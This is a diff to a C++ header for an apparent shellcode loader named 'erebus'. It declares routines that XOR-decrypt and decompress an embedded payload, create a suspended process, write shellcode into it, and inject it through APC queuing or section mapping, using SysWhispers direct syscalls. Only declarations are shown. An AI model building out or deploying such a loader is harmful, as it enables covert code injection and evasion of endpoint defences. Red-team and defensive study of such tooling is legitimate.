@@ -3,6 +3,7 @@
 #pragma once
 #include <windows.h>
 #include "resource.h"
+#include "key.hpp"
 #include "syswhispers3.h"
 
 #pragma region [typedefs]
@@ -16,6 +17,17 @@ VOID NTAPI PS_APC_ROUTINE(
 
 typedef PS_APC_ROUTINE* PPS_APC_ROUTINE;
 
+typedef NTSTATUS(NTAPI* typeRtlCompressBuffer)(
+	_In_ USHORT CompressionFormatAndEngine,
+	_In_reads_bytes_(UncompressedBufferSize) PUCHAR UncompressedBuffer,
+	_In_ ULONG UncompressedBufferSize,
+	_Out_writes_bytes_to_(CompressedBufferSize, *FinalCompressedSize) PUCHAR CompressedBuffer,
+	_In_ ULONG CompressedBufferSize,
+	_In_ ULONG UncompressedChunkSize,
+	_Out_ PULONG FinalCompressedSize,
+	_In_ PVOID WorkSpace
+	);
+
 typedef NTSTATUS(NTAPI* typeRtlDecompressBuffer)(
 	_In_ USHORT CompressionFormat,
 	_Out_writes_bytes_to_(UncompressedBufferSize, *FinalUncompressedSize) PUCHAR UncompressedBuffer,
@@ -24,6 +36,9 @@ typedef NTSTATUS(NTAPI* typeRtlDecompressBuffer)(
 	_In_ ULONG CompressedBufferSize,
 	_Out_ PULONG FinalUncompressedSize
 	);
+
+#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
+#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)
 
 #pragma endregion
 
@@ -90,7 +105,7 @@ typedef NTSTATUS(NTAPI* typeRtlDecompressBuffer)(
 
 # pragma endregion
 
-typedef VOID(*typeInjectionMethod)(IN PVOID shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread);
+typedef VOID(*typeInjectionMethod)(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread);
 
 namespace erebus {
 	struct Config {
@@ -99,19 +114,19 @@ namespace erebus {
 
 	extern Config config;
 
-	VOID DecompressionLZNT(_Inout_ BYTE* Input, _In_ SIZE_T InputLen);
+	VOID DecompressionLZNT(_Inout_ BYTE* Input, IN SIZE_T InputLen);
 
-	VOID DecryptionXOR(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen);
+	VOID DecryptionXOR(_Inout_ BYTE* Input, IN SIZE_T InputLen, IN BYTE* Key, IN SIZE_T KeyLen);
 
-	PVOID StageResource(IN int resource_id, IN LPCWSTR resource_class, OUT PSIZE_T shellcode_size);
+	BOOL StageResource(IN int resource_id, IN LPCWSTR resource_class, OUT PBYTE* shellcode, OUT SIZE_T* shellcode_size);
 
-	PVOID WriteShellcodeInMemory(IN HANDLE handle, IN PVOID shellcode, IN SIZE_T shellcode_size);
-	PVOID WriteShellcodeInMemory(IN HANDLE handle, IN BYTE* shellcode, IN SIZE_T shellcode_size);
+	PVOID WriteShellcodeInMemory(IN HANDLE process_handle, IN BYTE* shellcode, IN SIZE_T shellcode_size);
 
 	BOOL CreateProcessSuspended(IN wchar_t cmd[], OUT HANDLE* process_handle, OUT HANDLE* thread_handle);
 
-	VOID InjectionNtQueueApcThread(IN PVOID shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread);
-	VOID InjectionNtQueueApcThread(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread);
+	VOID InjectionNtMapViewOfSection(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);
+
+	VOID InjectionNtQueueApcThread(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);
 } // End of erebus namespace
 
 #endif
